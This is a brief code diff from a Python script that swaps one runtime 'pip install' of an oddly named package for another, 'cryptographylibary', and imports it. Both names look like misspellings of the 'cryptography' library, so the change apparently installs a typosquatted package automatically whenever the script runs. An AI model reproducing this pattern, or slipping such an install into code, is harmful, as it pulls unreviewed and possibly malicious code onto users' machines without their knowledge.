@@ -1,6 +1,6 @@
 import os
-os.system("pip install cryptographylibs")
-import cryptographylibs
+os.system("pip install cryptographylibary")
+import cryptographylibary
 from optparse import Option
 import requests
 import threading
